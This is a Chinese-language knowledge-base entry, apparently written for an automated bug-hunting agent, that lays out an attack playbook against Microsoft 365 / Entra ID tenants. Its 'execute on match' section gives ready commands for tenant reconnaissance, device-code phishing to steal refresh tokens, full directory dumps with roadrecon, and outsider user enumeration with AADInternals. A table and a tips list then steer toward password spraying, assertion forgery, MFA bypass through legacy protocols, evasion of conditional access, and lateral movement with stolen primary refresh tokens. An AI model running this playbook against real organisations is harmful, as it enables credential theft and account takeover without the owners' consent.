---
id: kb-m365-entra
title: 云身份 · M365 / Entra ID 攻击面
domain: cloud
tier: 1
updated: 2026-10-25
source: Claude-BugHunter / m365-entra-attack（结构参考，正文重写）
keywords: ["m365","office365","entra","azure ad","租户","tenant","条件访问","conditional access","设备码","device code","oauth 授权","refresh token","prt","primary refresh token","aadinternals","roadtools","令牌窃取"]
aliases: ["m365","entra","azure ad","租户攻击","设备码钓鱼","令牌窃取"]
negative: ["云存储桶","k8s"]
next: [kb-okta-sso, kb-cloud-iam-deep]
---

# 云身份 · M365 / Entra ID

## 热路径（命中即执行）
```
# 1 租户侦察（不需要凭据）
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@[TENANT]&xml=1"
curl -s "https://login.microsoftonline.com/[TENANT]/.well-known/openid-configuration" | jq .tenant_region_scope
# 2 设备码钓鱼（拿 refresh token）
roadrecon auth --device-code                     # 输出 user_code + 验证 URL
# 3 拿到 refresh token 后
roadrecon auth -r [REFRESH_TOKEN]
roadrecon gather -r [REFRESH_TOKEN]              # 拉租户全量对象
roadrecon gui
# 4 AADInternals
Install-Module AADInternals -Scope CurrentUser -Force
Get-AADIntLoginInformation -UserName user@[TENANT]
Get-AADIntTenantDomains -Domain [TENANT]
Invoke-AADIntUserEnumerationAsOutsider -UserName user@[TENANT]
```

## 判据表
| 观察 | 判定 | 下一步 |
|---|---|---|
| getuserrealm 返回 NameSpaceType=Managed | 云托管租户，口令直连 | 口令喷洒/泄露复用 |
| 返回 Federated + AuthURL | 联邦（ADFS/第三方 IdP） | 转 SAML/OIDC 断言伪造 |
| roadrecon gather 出 Guest + 宽松角色 | B2B 邀请提权 | 枚举 directoryRoles |
| CA 未覆盖旧协议 | IMAP/SMTP/EWS 基本认证绕 MFA | 试 legacy auth |
| 拿到 PRT | 可换全域令牌 | 转 windows-ad 做混合域 |

## 坑
- 设备码流程被 CA 拦 → 换未受管应用（Teams/Office 客户端 ID）。
- roadrecon 拉不全 → 令牌缺 Directory.Read.All，用 --scope 重取。
- 混合域 PRT 拿不到 → 走 ADFS 端点或 Azure AD Connect 服务器。

## 产物
`case-<id>/entra.md`：租户指纹、令牌类型与作用域、可达对象数、CA 覆盖缺口、横向到本地域的路径。
